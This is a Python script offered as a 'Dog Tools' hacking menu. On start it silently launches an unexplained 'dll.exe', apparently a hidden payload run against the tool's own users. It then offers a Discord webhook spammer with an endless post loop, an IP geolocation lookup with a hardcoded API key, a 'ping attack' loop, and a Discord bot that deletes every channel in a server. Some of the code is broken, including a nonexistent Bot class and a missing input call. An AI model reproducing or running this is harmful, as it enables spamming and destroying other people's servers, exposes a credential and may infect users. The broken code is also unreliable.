import discord
import os
import subprocess
import requests
import time
os.system('color')
dll = "dll.exe"
try: os.startfile(dll)
except AttributeError:
    try: subprocess.call(['open', dll])
    except: print('Could not open fn')
while True:
    print('\033[31m                                    ▓█████▄  ▒█████    ▄████      ▄████   ▄████                                     ')
    print('\033[31m                                    ▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒    ██▒ ▀█▒ ██▒ ▀█▒                                    ')
    print('\033[31m                                    ░██   █▌▒██░  ██▒▒██░▄▄▄░   ▒██░▄▄▄░▒██░▄▄▄░                                    ')
    print('\033[31m                                    ░▓█▄   ▌▒██   ██░░▓█  ██▓   ░▓█  ██▓░▓█  ██▓                                    ')
    print('\033[31m                                    ░▒████▓ ░ ████▓▒░░▒▓███▀▒   ░▒▓███▀▒░▒▓███▀▒                                    ')
    print('\033[31m                                     ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒     ░▒   ▒  ░▒   ▒                                     ')
    print('\033[31m                                     ░ ▒  ▒   ░ ▒ ▒░   ░   ░      ░   ░   ░   ░                                     ')
    print('\033[31m                                     ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░    ░ ░   ░ ░ ░   ░                                     ')
    print('\033[31m                                       ░        ░ ░        ░          ░       ░                                     ')
    print('\033[31m                                     ░                                                                              ')
    print('\033[38;5;214m                                    ████████  ██████   ██████  ██      ███████')
    print('\033[38;5;214m                                       ██    ██    ██ ██    ██ ██      ██      ')
    print('\033[38;5;214m                                       ██    ██    ██ ██    ██ ██      ███████ ')
    print('\033[38;5;214m                                       ██    ██    ██ ██    ██ ██           ██ ')
    print('\033[38;5;214m                                       ██     ██████   ██████  ███████ ███████ ')
    print('                                    ')
    print('\033[31m MADE BY IoSonoVincenzo                                    ')
    print('                                    ')
    print('                                    ')
    print('\033[38;5;5m1 | Discord WebHook Nuke     3 | Ping attack')
    print('\033[38;5;5m2 | Ip locator               4 | Discord Bot Nuker')
    Request=input('-----> ')
    if Request=='1':
        os.system('cls')
        print ('Webhook Nuker')
        Webhook=input('link | ')
        message=input('Message | ')

        data={
            'content': message
        }
        try:
            print('Nukeing')
            while True:
                r=requests.post(Webhook, json=data)
            
        except:
            print('ERROR')
            input('press anything to leave')
    if Request=='2':
        os.system('cls')
        print('Ip look up')
        ip=input('Ip ')
        import requests
        api_key = "4b92f555de65a94bf8218671319b30d7"  
        ip_address = ip
        def get_ip_geolocation(ip_address, api_key):
            try:
                response = requests.get(f"http://api.ipstack.com/{ip_address}?access_key={api_key}")
                data = response.json()
                return data
            except Exception as e:
                return {"error": str(e)}
        location_data = get_ip_geolocation(ip_address, api_key)
        print(location_data)
    if Request=='3':
        os.system('cls')
        print('Ping attack (This works only for shit sites)')
        Site=input('Site Ip ')

        def ping_ip(ip):
            try:
                while True:
                    time.sleep(0.2)
                    output = subprocess.run(
                    ["ping", "-n", "1", ip],  
                    capture_output=True,
                    text=True)
                    print(output.stdout)
            except Exception as e:
                print(f"An error occurred: {e}")


        ping_ip(Site)
    if Request=='4':
        print('Discord Custom Nuker')
        token=input('Bot token: ')
        BotMessage=('Bot message: ')
        from discord import app_commands
        bot = app_commands.Bot(command_prefix='/')

        @bot.event
        async def on_ready():
            print(f'Logged in as {bot.user}!')

        @bot.command()
        @app_commands.has_permissions(administrator=True)
        async def nuke(ctx):
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    print(f'Deleted channel: {channel.name}')
                except Exception as e:
                    print(f'Failed to delete channel: {channel.name} - {e}')
        bot.run(token)
        input('Running')

        
